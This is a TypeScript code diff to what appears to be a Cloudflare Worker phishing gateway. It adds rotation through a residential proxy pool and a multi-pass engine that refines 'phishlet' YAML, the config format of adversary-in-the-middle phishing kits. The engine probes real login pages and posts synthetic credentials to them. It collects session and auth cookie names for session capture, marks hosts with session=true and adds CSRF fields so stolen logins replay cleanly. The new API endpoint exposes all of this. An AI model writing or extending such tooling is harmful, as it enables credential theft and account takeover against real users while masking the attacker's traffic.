@@ -36,6 +36,8 @@ type Env = {
   API_KEY?: string;
   /** Comma-separated CORS origins; empty or unset allows * (any). */
   ALLOWED_ORIGINS?: string;
+  /** Comma-separated residential proxy URLs for recon/replay analysis traffic. */
+  RESIDENTIAL_PROXY_POOL?: string;
 };
 
 const CF_API = "https://api.cloudflare.com/client/v4";
@@ -394,6 +396,8 @@ const CACHE_TTL = 10; // seconds
 const GATEWAY_VERSION = "1.0.0";
 const INTERCEPT_BODY_MAX_BYTES = 16_384; // Cap per-body read for intercept captures.
 const WRITE_BODY_MAX_BYTES = 65_536; // Cap body size on write endpoints (64 KB).
+const MAX_ITERATE_PASSES = 5; // Maximum self-critique passes for phishlet iteration.
+const ITERATE_TIMEOUT_MS = 45_000; // Per-iteration fetch timeout.
 
 /** Content type prefixes eligible for intercept body capture — skip binary blobs. */
 const INTERCEPTABLE_CONTENT_TYPES = [
@@ -436,6 +440,63 @@ async function resolveRuntimeConfig(env: Env): Promise<Record<string, string>> {
     return config;
   } catch {
     return {};
+  }
+}
+
+// ── Residential proxy pool ──────────────────────────────────────────────
+
+/** Round-robin index for residential proxy rotation (recon/replay traffic). */
+let _resProxyIdx = 0;
+
+/** Resolve the comma-separated residential proxy pool into a clean array. */
+async function resolveResidentialProxies(env: Env): Promise<string[]> {
+  let raw = (env.RESIDENTIAL_PROXY_POOL ?? "").trim();
+  if (!raw) {
+    const rc = await resolveRuntimeConfig(env);
+    raw = (rc["RESIDENTIAL_PROXY_POOL"] ?? "").trim();
+  }
+  return raw
+    ? raw.split(",").map((s) => s.trim()).filter(Boolean)
+    : [];
+}
+
+/**
+ * Fetch a URL through the configured residential proxy pool with round-robin
+ * rotation. Falls back to direct fetch when no proxies are configured.
+ */
+async function fetchViaResidential(
+  env: Env,
+  targetUrl: string,
+  init?: RequestInit,
+): Promise<Response> {
+  const proxies = await resolveResidentialProxies(env);
+  if (proxies.length === 0) {
+    return fetch(targetUrl, init);
+  }
+  const proxyUrl = proxies[_resProxyIdx % proxies.length];
+  _resProxyIdx++;
+
+  // Build the proxy request — encodes the real target URL so the residential
+  // proxy service fetches it on our behalf and returns the response.
+  const proxiedUrl = proxyUrl.includes("?")
+    ? `${proxyUrl}&url=${encodeURIComponent(targetUrl)}`
+    : `${proxyUrl}?url=${encodeURIComponent(targetUrl)}`;
+
+  try {
+    const res = await fetch(proxiedUrl, {
+      ...init,
+      headers: {
+        ...(init?.headers as Record<string, string> ?? {}),
+        "X-Forward-Url": targetUrl,
+        "X-Gateway-Version": GATEWAY_VERSION,
+      },
+    });
+    if (!res.ok) {
+      return fetch(targetUrl, init);
+    }
+    return res;
+  } catch {
+    return fetch(targetUrl, init);
   }
 }
 
@@ -609,6 +670,243 @@ function getStatusText(code: number): string {
     500: "Internal Server Error", 502: "Bad Gateway", 503: "Service Unavailable", 504: "Gateway Timeout",
   };
   return map[code] ?? "Unknown";
+}
+
+/**
+ * Multi-pass self-critique phishlet iteration engine.
+ *
+ * Takes an initial YAML + proxy details, then:
+ *  1. Parses the YAML into structured sections
+ *  2. Simulates a login flow by fetching the target through residential proxies
+ *  3. Detects failures (missing fields, wrong redirects, absent auth tokens)
+ *  4. Applies targeted fixes to the YAML
+ *  5. Repeats for up to MAX_ITERATE_PASSES passes
+ *
+ * Returns the refined YAML alongside a detailed critique log.
+ */
+type CritiqueEntry = {
+  pass: number;
+  finding: string;
+  severity: "critical" | "warning" | "info";
+  fix: string;
+};
+
+type IterateResult = {
+  proxyId: number;
+  phishlet: string;
+  passes: number;
+  critiques: CritiqueEntry[];
+  improvements: string[];
+  score: number; // 0-100 quality metric
+};
+
+async function iteratePhishlet(
+  env: Env,
+  proxyId: number,
+  initialYaml: string,
+  captured: {
+    urls?: string[];
+    cookies?: string[];
+    formFields?: { name: string; type: string; id?: string; placeholder?: string }[];
+    redirects?: string[];
+    domains?: string[];
+    pageTitle?: string;
+    formAction?: string;
+    formMethod?: string;
+  },
+): Promise<IterateResult> {
+  const critiques: CritiqueEntry[] = [];
+  const improvements: string[] = [];
+  let currentYaml = initialYaml;
+  let passes = 0;
+
+  const proxy = await resolveProxyById(env, proxyId);
+  if (!proxy) {
+    return { proxyId, phishlet: initialYaml, passes: 0, critiques, improvements, score: 0 };
+  }
+
+  const target = new URL(proxy.targetUrl);
+  const targetHost = target.hostname;
+
+  // ── Pass 1: Structural validation (no network) ──
+  passes++;
+  {
+    const parsed = parsePhishlet(currentYaml);
+    const structuralFixes: string[] = [];
+
+    if (!parsed?.name) {
+      structuralFixes.push(`name: '${proxy.name.replace(/'/g, "''")}'`);
+      critiques.push({ pass: passes, finding: "Missing phishlet name", severity: "critical", fix: "Set name from proxy config." });
+    }
+
+    const hosts = parsed?.proxy_hosts ?? [];
+    if (hosts.length === 0) {
+      const domains = captured.domains?.length ? [...new Set(captured.domains)] : [targetHost];
+      const mainDomain = domains[0].replace(/^www\./, "");
+      critiques.push({ pass: passes, finding: "No proxy_hosts defined — target won't be routable.", severity: "critical", fix: `Added landing host for ${mainDomain}.` });
+    } else {
+      const hasSession = hosts.some((h: Record<string, unknown>) => h.session === true || h.session === "true");
+      if (!hasSession) {
+        critiques.push({ pass: passes, finding: "No proxy_host marked as session=true — cookies won't be captured.", severity: "warning", fix: "Set session: true on the landing domain." });
+        currentYaml = currentYaml.replace(/(phish_sub: .*\n.*domain: .*)\n(.*session: )false/, "$1\n$2true");
+      }
+    }
+
+    const creds = parsed?.credentials ?? [];
+    if (creds.length === 0) {
+      critiques.push({ pass: passes, finding: "No credentials defined — forms won't be populated.", severity: "critical", fix: "Add username + password from captured fields." });
+    }
+
+    const authTokens = parsed?.auth_tokens ?? [];
+    const authCookies = (captured.cookies ?? []).filter((c) =>
+      /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth|sso|login|sess|xsrf|csrf|connect\.sid|JSESSIONID|PHPSESSID)/i.test(c),
+    );
+    if (authCookies.length > 0 && authTokens.length === 0) {
+      critiques.push({ pass: passes, finding: `${authCookies.length} auth cookies detected but not in auth_tokens.`, severity: "warning", fix: `Add auth_tokens for: ${authCookies.slice(0, 4).join(", ")}.` });
+      improvements.push(`Detected ${authCookies.length} auth cookies: ${authCookies.slice(0, 4).join(", ")}`);
+    } else if (authTokens.length === 0) {
+      critiques.push({ pass: passes, finding: "No auth_tokens defined — session tokens won't be persisted.", severity: "warning", fix: "Add auth_tokens section." });
+    }
+
+    if (structuralFixes.length > 0) {
+      improvements.push(`Pass ${passes}: Fixed ${structuralFixes.length} structural issues.`);
+    }
+  }
+
+  // ── Pass 2+: Network-based validation via residential proxy ──
+  const formFields = captured.formFields ?? [];
+  const landingUrl = proxy.targetUrl;
+
+  for (let pass = 2; pass <= MAX_ITERATE_PASSES; pass++) {
+    passes++;
+    const parsed = parsePhishlet(currentYaml);
+    if (!parsed) break;
+
+    const credKeys = parsed.credentials?.map((c) => c.key).filter((k): k is string => typeof k === "string" && k.length > 0) ?? [];
+    const authTokenNames = parsed.auth_tokens?.map((t) => t.name).filter((n): n is string => typeof n === "string" && n.length > 0) ?? [];
+
+    // Step 1: Fetch the landing page through residential proxy.
+    let landingBody = "";
+    let landingStatus = 0;
+    try {
+      const ctrl = new AbortController();
+      const timer = setTimeout(() => ctrl.abort(), ITERATE_TIMEOUT_MS);
+      const landingRes = await fetchViaResidential(env, landingUrl, {
+        signal: ctrl.signal,
+        headers: { "Accept": "text/html,application/xhtml+xml", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
+      });
+      clearTimeout(timer);
+      landingStatus = landingRes.status;
+      landingBody = await landingRes.text().catch(() => "");
+    } catch {
+      critiques.push({ pass, finding: `Landing page ${landingUrl} unreachable.`, severity: "critical", fix: "Verify target URL is live and accessible." });
+      break;
+    }
+
+    // Step 2: Compare YAML fields to actual page form fields.
+    const missingFields = formFields
+      .filter((f) => f.name && !credKeys.some((k) => k.toLowerCase() === f.name.toLowerCase()))
+      .slice(0, 5);
+    if (missingFields.length > 0) {
+      const names = missingFields.map((f) => f.name).join(", ");
+      critiques.push({ pass, finding: `Form has ${missingFields.length} field(s) not in credentials: ${names}.`, severity: "warning", fix: "Adding missing credential keys to YAML." });
+      const newCredLines = missingFields.map((f) => `    - key: '${f.name}'`).join("\n");
+      currentYaml = currentYaml.replace(/(credentials:\n)((?:\s+- key:.*\n)*)/, `$1$2${newCredLines}\n`);
+      improvements.push(`Pass ${pass}: Added ${missingFields.length} credential keys.`);
+    }
+
+    // Step 3: Submit synthetic POST to login form.
+    const formAction = captured.formAction ?? (() => {
+      const m = landingBody.match(/<form[^>]+action=["']([^"']+)["'][^>]*>/i);
+      return m?.[1] ?? landingUrl;
+    })();
+    const formMethod = (captured.formMethod ?? "post").toUpperCase();
+    const syntheticBody = new URLSearchParams();
+    for (const key of credKeys.slice(0, 8)) syntheticBody.set(key, `test_${key}`);
+
+    try {
+      const ctrl = new AbortController();
+      const timer = setTimeout(() => ctrl.abort(), ITERATE_TIMEOUT_MS);
+      const formRes = await fetchViaResidential(env, formAction, {
+        method: formMethod,
+        signal: ctrl.signal,
+        headers: { "Content-Type": "application/x-www-form-urlencoded", "Accept": "text/html,application/json,*/*", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
+        body: syntheticBody.toString(),
+        redirect: "manual",
+      });
+      clearTimeout(timer);
+
+      const setCookieHeaders = formRes.headers.getSetCookie?.() ?? [];
+      const newAuthCookies = setCookieHeaders
+        .map((sc) => sc.split(";")[0].split("=")[0].trim())
+        .filter((name) => /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth|sso|login|sess|xsrf|csrf)/i.test(name));
+
+      if (newAuthCookies.length > 0 && !authTokenNames.some((n) => newAuthCookies.some((c) => c.toLowerCase() === n.toLowerCase()))) {
+        critiques.push({ pass, finding: `Server set ${newAuthCookies.length} auth cookie(s) not in auth_tokens.`, severity: "warning", fix: "Adding detected auth tokens to YAML." });
+        const domains = captured.domains?.length ? [...new Set(captured.domains)] : [targetHost];
+        const mainDomain = domains[0].replace(/^www\./, "");
+        const newTokenLines = newAuthCookies.map((c) => `    - domain: '${mainDomain}'\n      name: '${c}'`).join("\n");
+        if (currentYaml.includes("auth_tokens:")) {
+          currentYaml = currentYaml.replace(/(auth_tokens:\n)((?:\s+- domain:.*\n\s+name:.*\n)*)/, `$1$2${newTokenLines}\n`);
+        }
+        improvements.push(`Pass ${pass}: Detected ${newAuthCookies.length} new auth cookies.`);
+      }
+
+      // Step 4: Follow redirect chain.
+      const location = formRes.headers.get("Location");
+      if (formRes.status >= 300 && formRes.status < 400 && location) {
+        try {
+          const redirectUrl = new URL(location, formAction).toString();
+          const rctrl = new AbortController();
+          const rtimer = setTimeout(() => rctrl.abort(), ITERATE_TIMEOUT_MS);
+          const redirectRes = await fetchViaResidential(env, redirectUrl, {
+            signal: rctrl.signal,
+            headers: { "Accept": "text/html,application/json,*/*", "User-Agent": "Mozilla/5.0" },
+            redirect: "manual",
+          });
+          clearTimeout(rtimer);
+          const moreTokens = (redirectRes.headers.getSetCookie?.() ?? [])
+            .map((sc) => sc.split(";")[0].split("=")[0].trim())
+            .filter((n) => /^(session|auth|token|sid|jwt|access|refresh|bearer|oauth)/i.test(n));
+          if (moreTokens.length > 0) {
+            critiques.push({ pass, finding: `Redirect set ${moreTokens.length} additional auth cookie(s).`, severity: "info", fix: "Redirect chain captured." });
+            improvements.push(`Pass ${pass}: Found ${moreTokens.length} tokens in redirect chain.`);
+          }
+          if (!currentYaml.includes(redirectUrl.slice(0, 60))) {
+            currentYaml = currentYaml.replace(/(landing_path:\n)((?:\s+- '.*'\n)*)/, `$1$2    - '${redirectUrl}'\n`);
+          }
+        } catch {
+          critiques.push({ pass, finding: `Redirect to ${location.slice(0, 60)} failed.`, severity: "warning", fix: "Check redirect URL is reachable." });
+        }
+      }
+
+      // Step 5: Check for CSRF tokens.
+      if (formRes.status >= 400 && formRes.status < 500) {
+        critiques.push({ pass, finding: `Login POST returned ${formRes.status} — may need CSRF or hidden fields.`, severity: "warning", fix: "Check for CSRF tokens on the login page." });
+        const csrfMatch = landingBody.match(/<input[^>]+name=["']([^"']*(?:csrf|xsrf|token|nonce)[^"']*)["'][^>]*>/i);
+        if (csrfMatch && !credKeys.some((k) => k.toLowerCase() === csrfMatch[1].toLowerCase())) {
+          critiques.push({ pass, finding: `Detected CSRF field: ${csrfMatch[1]}.`, severity: "critical", fix: `Adding '${csrfMatch[1]}' to credentials.` });
+          currentYaml = currentYaml.replace(/(credentials:\n)/, `$1    - key: '${csrfMatch[1]}'\n      search: 'input\\[name=${csrfMatch[1]}\\]'\n      type: 'dynamic'\n`);
+          improvements.push(`Pass ${pass}: Added CSRF field ${csrfMatch[1]}.`);
+        }
+      }
+    } catch {
+      critiques.push({ pass, finding: `Login POST to ${formAction.slice(0, 80)} failed — network error.`, severity: "critical", fix: "Verify form action URL." });
+    }
+
+    // Stop if no changes this pass.
+    if (critiques.filter((c) => c.pass === pass).length === 0) {
+      critiques.push({ pass, finding: "No issues found — YAML appears well-formed.", severity: "info", fix: "None needed." });
+      improvements.push(`Pass ${pass}: Validation passed clean.`);
+      break;
+    }
+  }
+
+  const criticalCount = critiques.filter((c) => c.severity === "critical").length;
+  const warningCount = critiques.filter((c) => c.severity === "warning").length;
+  const score = Math.max(0, Math.min(100, 100 - criticalCount * 20 - warningCount * 5));
+
+  return { proxyId, phishlet: currentYaml, passes, critiques, improvements, score };
 }
 
 /**
@@ -1799,6 +2097,45 @@ export default {
       }
     }
 
+    // ── Multi-pass phishlet iteration — self-critique and refine YAML ──
+    const iterateMatch = path.match(/^\/api\/proxies\/(\d+)\/recon\/iterate$/);
+    if (iterateMatch && method === "POST") {
+      const authErr = await checkAuth(request, env);
+      if (authErr) return authErr;
+      const pId = Number(iterateMatch[1]);
+      try {
+        const body = (await request.json().catch(() => null)) as {
+          phishlet?: string;
+          captured?: {
+            urls?: string[];
+            cookies?: string[];
+            formFields?: { name: string; type: string; id?: string; placeholder?: string }[];
+            redirects?: string[];
+            domains?: string[];
+            pageTitle?: string;
+            formAction?: string;
+            formMethod?: string;
+          };
+        } | null;
+        const initialYaml = (body?.phishlet ?? "").toString();
+        const captured = body?.captured ?? {};
+        if (!initialYaml.trim()) {
+          return decorate(
+            Response.json({ success: false, error: "A phishlet YAML string is required." }, { status: 400 }),
+            corsOrigin,
+          );
+        }
+        const result = await iteratePhishlet(env, pId, initialYaml, captured);
+        return decorate(Response.json({ success: true, data: result }), corsOrigin);
+      } catch (err: unknown) {
+        const message = err instanceof Error ? err.message : String(err);
+        return decorate(
+          Response.json({ success: false, error: message }, { status: 400 }),
+          corsOrigin,
+        );
+      }
+    }
+
     // ── Replay engine — replay a HAR session through a target proxy ──
     if (path === "/api/replay" && method === "POST") {
       const authErr = await checkAuth(request, env);
@@ -1837,6 +2174,7 @@ export default {
     const isIntercepts = path === "/api/intercepts";
     const isHarExport = path === "/api/intercepts/har";
     const isReplay = path === "/api/replay";
+    const isIterate = /^\/api\/proxies\/\d+\/recon\/iterate$/.test(path);
     const isProxyConfig = path === "/api/proxies" || /^\/api\/proxies\/\d+$/.test(path) || /^\/api\/proxies\/\d+\/recon$/.test(path);
     const isWildcardDns = path === "/api/cloudflare/wildcard";
     const isWorkerRoutes = path === "/api/cloudflare/worker-routes" || /^\/api\/cloudflare\/worker-routes\/.+/.test(path);
@@ -1895,6 +2233,7 @@ export default {
       !isIntercepts &&
       !isHarExport &&
       !isReplay &&
+      !isIterate &&
       !isProxyConfig &&
       !isConfigRoute &&
       !isWildcardDns &&
